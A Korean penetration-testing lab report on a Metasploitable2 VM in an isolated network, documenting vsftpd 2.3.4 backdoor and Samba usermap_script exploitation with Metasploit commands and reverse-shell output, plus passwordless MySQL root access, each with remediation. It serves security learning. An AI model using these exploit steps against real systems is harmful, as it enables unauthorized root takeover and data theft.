# 모의해킹 보고서: Metasploitable2 취약점 점검

## 1. 개요 (Executive Summary)

본 보고서는 모의해킹 학습 및 포트폴리오 목적으로, 의도적으로 취약하게 구성된
Metasploitable2 가상머신을 대상으로 수행한 취약점 점검 결과를 정리한 것이다.
점검은 격리된 가상 네트워크 환경에서 진행되었으며, 외부 시스템이나 실제
서비스에 대한 공격은 포함되지 않는다.

점검 결과 FTP(vsftpd 2.3.4), Samba(usermap_script), MySQL(약한 인증) 등
총 **3건의 취약점**이 발견되었으며, 이 중 2건은 인증 없이 원격에서 최고
권한(root)을 획득할 수 있는 Critical 등급으로 확인되었다.

| 구분 | 내용 |
|---|---|
| 점검 대상 | Metasploitable2 (192.168.118.129) |
| 점검 기간 | 2026-10-02 |
| 점검자 | 이기원 |
| 발견 취약점 수 | 3건 (Critical 2, High 1) |

---

## 2. 점검 범위 및 환경 (Scope)

### 2.1 대상 시스템
- **Target**: Metasploitable2 (192.168.118.129)
- **Attacker**: Kali Linux 2026.3 (192.168.118.128)

### 2.2 네트워크 구성
- VMware Workstation Pro 17 기반 가상 환경
- Host-only 네트워크(VMnet, 192.168.118.0/24)로 외부 인터넷과 완전히 격리
- 공격자(Kali)와 대상(Metasploitable2)만 동일 네트워크에 연결

```
[Kali Linux]  <----Host-only 네트워크---->  [Metasploitable2]
192.168.118.128                              192.168.118.129
   (공격자)                                      (대상)
```

### 2.3 사용 도구
- Nmap (포트/서비스 스캔)
- Metasploit Framework 6.5.3 (취약점 공격)
- MySQL/MariaDB 클라이언트

---

## 3. 방법론 (Methodology)

1. **정찰 (Reconnaissance)**: ping, nmap을 이용해 대상의 생존 여부 및 열린 포트/서비스 확인
2. **취약점 분석**: 확인된 서비스 버전을 기반으로 알려진 취약점(CVE) 조사
3. **침투 (Exploitation)**: Metasploit 및 수동 접속을 통한 취약점 공격 시도
4. **권한 확인 (Post-Exploitation)**: 획득한 세션의 권한 및 시스템 정보 확인
5. **보고 (Reporting)**: 결과 정리 및 대응 방안 도출

---

## 4. 취약점 상세 (Findings)

### 4.1 [Critical] VSFTPD 2.3.4 Backdoor Command Execution

| 항목 | 내용 |
|---|---|
| 위험도 | **Critical** |
| CVE | CVE-2011-2523 |
| 대상 | 192.168.118.129:21 (FTP) |
| 사용 모듈 | `exploit/unix/ftp/vsftpd_234_backdoor` |

#### 설명
vsftpd 2.3.4 버전은 2011년 공식 배포 서버가 침해되어, 소스코드에 백도어가
삽입된 악성 버전이 일정 기간 배포된 이력이 있다. 해당 백도어는 FTP 로그인
시도 시 특정 문자열(`:)`)을 username에 포함하면 서버의 6200번 포트에
인증 없는 root 권한 쉘을 여는 방식으로 동작한다.

#### 재현 절차

1. **정찰**: ping으로 대상 생존 확인
   ```
   $ ping 192.168.118.129
   64 bytes from 192.168.118.129: icmp_seq=1 ttl=64 time=1.02 ms
   3 packets transmitted, 3 received, 0% packet loss
   ```
   <img width="544" height="192" alt="ping 결과" src="https://github.com/user-attachments/assets/9b4d0c48-b00a-4094-a0de-5bca6ea60048" />

2. **취약점 식별**: Metasploit 모듈 검색 및 선택
   ```
   msf6 > search vsftpd
   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
   ```

3. **옵션 설정**
   ```
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.118.129
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.118.128
   ```

4. **공격 실행**
   ```
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

   [*] 192.168.118.129:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
   [+] 192.168.118.129:21 - The target appears to be vulnerable.
   [+] 192.168.118.129:21 - Backdoor has been spawned!
   [*] Meterpreter session 1 opened (192.168.118.128:4444 -> 192.168.118.129:36529)
   ```
   <img width="1000" height="140" alt="exploit 성공 로그" src="https://github.com/user-attachments/assets/1b31437b-b99e-4f12-b424-777641db2163" />

5. **권한 확인**
   ```
   meterpreter > getuid
   meterpreter > sysinfo
   ```
   <img width="753" height="129" alt="getuid / sysinfo 결과" src="https://github.com/user-attachments/assets/62ecd4be-f327-4903-ae60-2254b5b97050" />

#### 영향 (Impact)
공격자가 FTP 포트에 대한 단순 접근만으로, 인증 절차 없이 대상 시스템의
**최고 관리자(root) 권한을 원격으로 획득**할 수 있다. 이는 시스템 전체의
완전한 장악(파일 열람/수정/삭제, 추가 악성 행위, 내부망 추가 침투 등)으로
이어질 수 있는 가장 심각한 수준의 취약점이다.

#### 대응 방안 (Remediation)
1. 취약한 vsftpd 2.3.4 버전을 즉시 제거하고 공식 저장소의 최신 버전으로 재설치
2. 소프트웨어 설치 시 체크섬/디지털 서명 검증 절차 도입
3. 외부에 불필요하게 노출된 FTP 서비스는 비활성화하거나 SFTP 등 안전한 대안으로 전환
4. 네트워크 방화벽에서 FTP(21번 포트)에 대한 접근을 신뢰된 IP로 제한

---

### 4.2 [Critical] Samba "username map script" Command Execution

| 항목 | 내용 |
|---|---|
| 위험도 | **Critical** |
| CVE | CVE-2007-2447 |
| 대상 | 192.168.118.129:139/445 (Samba) |
| 사용 모듈 | `exploit/multi/samba/usermap_script` |

#### 설명
Samba 3.0.20 ~ 3.0.25rc3 버전은 `username map script` 설정 옵션이 활성화된
경우, 로그인 시 전달되는 사용자명(username)에 포함된 셸 메타문자가 제대로
검증되지 않아 임의의 시스템 명령이 실행되는 취약점이 존재한다. 공격자는
이를 이용해 인증 과정 없이 원격에서 임의 명령을 실행할 수 있다.

#### 재현 절차

1. **취약점 식별 및 옵션 설정**
   ```
   msf6 > search usermap_script
   msf6 > use exploit/multi/samba/usermap_script
   msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.118.129
   msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.118.128
   ```
   > <img width="1113" height="728" alt="image" src="https://github.com/user-attachments/assets/7c8e97a6-30a6-4bf4-8e20-8b885b700f6e" />


2. **공격 실행 및 권한 확인**
   ```
   msf6 exploit(multi/samba/usermap_script) > exploit

   [*] Started reverse TCP handler on 192.168.118.128:4444
   [*] Command shell session 1 opened (192.168.118.128:4444 -> 192.168.118.129:32942)

   whoami
   root
   id
   uid=0(root) gid=0(root)
   hostname
   metasploitable
   ```
   > <img width="1129" height="294" alt="image" src="https://github.com/user-attachments/assets/3fca605a-84c0-40ef-a66d-de9265628744" />


   > 참고: 본 모듈은 Meterpreter가 아닌 **일반 command shell**을 반환한다.
   > 따라서 Meterpreter 전용 명령어(`getuid`, `sysinfo`)는 사용할 수 없으며,
   > 리눅스 표준 명령어(`whoami`, `id`, `hostname` 등)로 권한을 확인해야 한다.

#### 영향 (Impact)
공격자가 Samba 서비스(139/445번 포트)에 접근 가능한 경우, **인증 절차 없이
원격 명령 실행 및 root 권한 획득**이 가능하다. vsftpd 백도어와는 별개의
취약점으로, 하나의 시스템에 다수의 독립적인 침투 경로가 존재함을 보여준다.

#### 대응 방안 (Remediation)
1. Samba를 최신 패치 버전으로 업그레이드
2. `username map script` 옵션이 불필요하면 비활성화
3. Samba 서비스에 대한 외부 접근을 신뢰된 네트워크로 제한
4. 불필요한 SMB 포트(139, 445)는 방화벽에서 차단

---

### 4.3 [High] MySQL 인증 없는 Root 계정 접근

| 항목 | 내용 |
|---|---|
| 위험도 | **High** |
| 유형 | 설정 미흡 (Weak/No Authentication) |
| 대상 | 192.168.118.129:3306 (MySQL/MariaDB 5.0.51a) |

#### 설명
대상 시스템의 MySQL(MariaDB) 서버는 `root` 계정에 **비밀번호가 설정되어
있지 않아**, 원격에서 자격 증명 없이 최고 권한으로 데이터베이스 서버에
접근할 수 있는 상태였다. 이는 공격을 위한 익스플로잇 없이, 단순 설정
미흡만으로 발생하는 대표적인 취약점 유형이다.

#### 재현 절차

1. **원격 접속 시도** (비밀번호 없이 root로 접속)
   ```
   $ mysql -h 192.168.118.129 -u root --skip-ssl

   Welcome to the MariaDB monitor.
   Server version: 5.0.51a-3ubuntu5 (Ubuntu)
   MySQL [(none)]>
   ```
   > <img width="716" height="377" alt="image" src="https://github.com/user-attachments/assets/9ea6e960-9c8e-4acc-9194-e02e78c2c1bc" />


   > 참고: Kali의 최신 mysql 클라이언트와 대상 서버의 구버전 MySQL 간
   > TLS 버전 불일치로 기본 접속 시 `ERROR 2026: TLS/SSL error`가 발생하여,
   > `--skip-ssl` 옵션으로 레거시 연결을 수행하였다.

2. **데이터베이스 목록 확인**
   ```sql
   MySQL [(none)]> show databases;
   +--------------------+
   | Database           |
   +--------------------+
   | information_schema |
   | dvwa               |
   | metasploit          |
   | mysql               |
   | owasp10             |
   | tikiwiki            |
   | tikiwiki195         |
   +--------------------+
   ```
   > <img width="716" height="377" alt="image" src="https://github.com/user-attachments/assets/5d8d0592-979a-4289-87d1-28dfd9244f82" />


3. **계정 정보 테이블 확인** (민감 정보 노출 증거)
   ```sql
   MySQL [mysql]> select User, Host, Password from user;
   +-----------------+----------+
   | User            | Password |
   +-----------------+----------+
   | debian-sys-maint|          |
   | guest           |          |
   | root            |          |
   +-----------------+----------+
   ```
   > <img width="748" height="234" alt="image" src="https://github.com/user-attachments/assets/401d80ca-7f5b-471c-a2b7-d29a02c9400d" />

   `root` 계정의 Password 컬럼이 비어 있어, 해시값조차 설정되지 않은
   상태임을 확인하였다.

#### 영향 (Impact)
공격자가 네트워크 접근만 가능하면 **별도의 익스플로잇 없이** 데이터베이스
전체에 대한 읽기/쓰기/삭제 권한을 획득할 수 있다. 이 서버에는 다른 취약
애플리케이션(dvwa, owasp10 등)의 데이터베이스도 함께 존재해, 침해 시
연쇄적인 피해로 이어질 수 있다.

#### 대응 방안 (Remediation)
1. 모든 MySQL 계정에 강력한 비밀번호 설정 (특히 root)
2. `mysql_secure_installation` 등을 이용한 초기 보안 설정 적용
3. 원격에서의 root 로그인 차단, 애플리케이션 전용 최소 권한 계정 사용
4. 3306번 포트에 대한 외부 접근을 신뢰된 IP/네트워크로 제한

---

## 5. 종합 결론 및 권고사항

| 번호 | 취약점명 | 위험도 | 상태 |
|---|---|---|---|
| 1 | VSFTPD 2.3.4 Backdoor | Critical | 미조치 (연습 환경) |
| 2 | Samba usermap_script RCE | Critical | 미조치 (연습 환경) |
| 3 | MySQL 인증 없는 Root 접근 | High | 미조치 (연습 환경) |

Metasploitable2는 교육용으로 다수의 취약점이 의도적으로 포함된 시스템으로,
실제 환경에서 이러한 수준의 취약점이 방치되는 경우는 드물다. 그러나 본
점검을 통해 **① 소스/배포 과정이 침해된 소프트웨어(vsftpd), ② 설정 옵션의
입력값 검증 미흡(Samba), ③ 기본 보안 설정 누락(MySQL)** 이라는 서로 다른
세 가지 유형의 보안 문제가 시스템 전체 장악으로 이어질 수 있음을 실습을
통해 확인할 수 있었다.

추후 웹 애플리케이션(DVWA) 대상의 OWASP Top 10 기반 점검을 별도 보고서로
진행하여 포트폴리오를 확장할 예정이다.

---

## 6. 부록

- Metasploit 모듈
  - `exploit/unix/ftp/vsftpd_234_backdoor`
  - `exploit/multi/samba/usermap_script`
- 참고 자료
  - CVE-2011-2523 (VSFTPD)
  - CVE-2007-2447 (Samba usermap_script)
  - Rapid7 Metasploitable2 공식 문서
